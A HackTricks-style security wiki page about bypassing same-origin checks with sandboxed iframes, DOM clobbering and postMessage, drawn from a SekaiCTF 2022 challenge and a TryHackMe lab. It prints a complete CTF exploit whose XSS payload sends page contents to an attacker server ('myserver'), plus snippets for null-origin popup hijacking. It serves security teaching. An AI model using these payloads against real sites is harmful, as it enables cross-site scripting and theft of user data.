# Bypassing SOP with Iframes - 2

{{#include ../../banners/hacktricks-training.md}}

## Iframes in SOP-2

In the [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) for this [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_) proposes a similar method to the previous section. Let's check it.<sup>[[3]](#references)</sup>

In this challenge the attacker needs to **bypass** this:

```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```

If he does, he can send a **postmessage** with HTML content that is going to be written in the page with **`innerHTML`** without sanitation (**XSS**).

The way to bypass the **first check** is by making **`window.calc.contentWindow`** to **`undefined`** and **`e.source`** to **`null`**:

- **`window.calc.contentWindow`** is actually **`document.getElementById("calc")`**. You can clobber **`document.getElementById`** with **`<img name=getElementById />`**. The Sanitizer API proposal discusses DOM-clobbering considerations separately from ordinary markup sanitization.<sup>[[5]](#references)</sup>
  - Therefore, you can clobber **`document.getElementById("calc")`** with **`<img name=getElementById /><div id=calc></div>`**. Then, **`window.calc`** will be **`undefined`**.
  - Now, we need **`e.source`** to be **`undefined`** or **`null`** (because `==` is used instead of `===`, `null == undefined` is `true`). In the challenge's browser behavior, sending the message from an iframe and immediately removing that iframe causes the queued event's **`source`** to be observed as `null`; the serialized **`origin`** is a separate property.<sup>[[3]](#references)[[4]](#references)</sup>

```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) // the receiver observes e.source === null
```

In order to bypass the **second check** about token is by sending **`token`** with value `null` and making **`window.token`** value **`undefined`**:

- Sending `token` in the postMessage with value `null` is trivial.
- **`window.token`** is assigned by a `getCookie` function that reads **`document.cookie`**. Accessing cookies in this sandboxed opaque-origin context triggers an error in the challenge, leaving `window.token` as `undefined`.

The final solution by [**@terjanq**](https://twitter.com/terjanq) is the [**following**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):<sup>[[4]](#references)</sup>

```html
<html>
  <body>
    <script>
      // Abuse "expr" param to cause a HTML injection and
      // clobber document.getElementById and make window.calc.contentWindow undefined
      open(
        'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
      )

      function start() {
        var ifr = document.createElement("iframe")
        // Create a sandboxed iframe, as sandboxed iframes will have origin null
        // this null origin will document.cookie trigger an error and window.token will be undefined
        ifr.sandbox = "allow-scripts allow-popups"
        ifr.srcdoc = `<script>(${hack})()<\/script>`

        document.body.appendChild(ifr)

        function hack() {
          var win = open("https://obligatory-calc.ctf.sekai.team")
          setTimeout(() => {
            parent.postMessage("remove", "*")
            // this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
            // token=null equals to undefined and e.source will be null so null == undefined
            win.postMessage(
              {
                token: null,
                result:
                  "<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
              },
              "*"
            )
          }, 1000)
        }

        // this removes the iframe so e.source becomes null in postMessage event.
        onmessage = (e) => {
          if (e.data == "remove") document.body.innerHTML = ""
        }
      }
      setTimeout(start, 1000)
    </script>
  </body>
</html>
```

### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)

A recent TryHackMe task (“Vulnerable Codes”) demonstrates how OAuth popups can be hijacked when the opener lives inside a sandboxed iframe that only allows scripts and popups. The iframe forces both itself and the popup into a `"null"` origin, so handlers checking `if (origin !== window.origin) return` silently fail because `window.origin` inside the popup is also `"null"`. Even though the browser still exposes the real `location.origin`, the victim never inspects it, so attacker-controlled messages glide through.<sup>[[2]](#references)</sup>

```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
  <script>
    const pop = open('https://oauth.example/callback');
    pop.postMessage({ cmd: 'getLoginCode' }, '*');
  <\/script>`;
document.body.appendChild(frame);
```

Takeaways for abusing that setup:

- Handlers that compare `origin` with `window.origin` inside the popup can be bypassed because both evaluate to `"null"`, so forged messages look legitimate.
- A sandbox that grants `allow-popups` but omits `allow-same-origin` can propagate sandbox restrictions to a popup unless `allow-popups-to-escape-sandbox` is also present. Test the actual navigation and browser because the resulting origin and opener relationship depend on those flags.

### Source-nullification & frame-restriction bypasses

Industry writeups around CVE-2024-49038 highlight two reusable primitives for this page: (1) you can still interact with pages that set `X-Frame-Options: DENY` by launching them via `window.open` and posting messages once the navigation settles, and (2) you can brute-force `event.source == victimFrame` checks by removing the iframe immediately after sending a message so that the receiver only sees `null` in the handler.<sup>[[1]](#references)</sup>

```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
  const victim = open('https://target-app/');
  setTimeout(() => {
    probe.contentWindow.postMessage(payload, '*');
    probe.remove();
  }, 500);
};
document.body.appendChild(probe);
```

Combine this with the DOM-clobbering trick above: once the receiver only sees `event.source === null`, any comparison against `window.calc.contentWindow` or similar collapses, letting you ship malicious HTML sinks through `innerHTML` again.

## References

- [1] [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong)
- [2] [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)
- [3] [SekaiCTF 2022 - obligatory-calc solution](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution)
- [4] [obligatory-calc final solution (calc.html) by @terjanq](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html)
- [5] [WICG Sanitizer API - DOM clobbering considerations](https://wicg.github.io/sanitizer-api/index.html#dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
